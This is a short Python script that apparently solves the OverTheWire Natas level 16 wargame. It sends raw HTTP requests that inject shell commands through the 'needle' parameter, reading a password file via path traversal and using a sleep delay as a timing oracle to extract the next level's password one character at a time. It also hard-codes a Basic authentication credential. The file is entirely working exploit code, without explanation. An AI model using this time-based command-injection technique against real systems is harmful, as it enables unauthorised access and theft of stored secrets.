import socket
import time

words = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789/+="
result = ""
for x in range(1, 50):
    for word in words:
        send = socket.socket(socket.AF_INET, socket.SOCK_STREAM, 0)
        send.connect(("178.79.134.250", 80))
        data = b"GET /?needle=$(if+[+" + word.encode() + b"+=+$(arr=$(cat+../../../../../../../etc/natas_webpass/natas17)%0aecho%0aexpr+substr+$arr+" + str(x).encode() + b"+1)+]%0athen%0asleep+15%0afi) " + b"HTTP/1.1\r\n"
        data += b"Host: natas16.natas.labs.overthewire.org\r\n"
        data += b"Cookie: __cfduid=dd268278e25e6a2d33a5f0fcca5f072541488501913; __utma=176859643.273939219.1488501915.1488501915.1488501915.1; __utmz=176859643.1488501915.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none)\r\n"
        data += b"Authorization: Basic bmF0YXMxNjpXYUlIRWFjajYzd25OSUJST0hlcWkzcDl0MG01bmhtaA==\r\n"
        data += b"\r\n"
        time1 = time.time()
        send.send(data)
        recv = send.recv(1500)
        if time.time() - time1 > 10:
            result+=word
        send.close()
    print(result)
